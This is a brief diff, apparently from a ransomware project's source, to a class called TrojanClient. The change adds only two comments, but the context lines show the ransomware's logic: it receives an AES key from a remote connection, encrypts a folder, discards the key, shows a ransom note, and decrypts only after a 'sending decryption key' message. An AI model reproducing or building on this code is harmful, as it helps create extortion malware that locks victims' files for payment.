@@ -138,6 +138,7 @@ class TrojanClient:
         
         aes_key = protocol.receive(self.connection)
         
+        # encryption
         FileEncryptor.encrypt_folder(self.folder, aes_key)
         del aes_key
         RansomNote.display_encryption_note()
@@ -148,6 +149,7 @@ class TrojanClient:
         if (msg_decode != "sending decryption key"):
             raise ValueError("unexpected message")
 
+        #decrepption
         aes_key = protocol.receive(self.connection)
         FileEncryptor.decrypt_folder(self.folder, aes_key)
         del aes_key
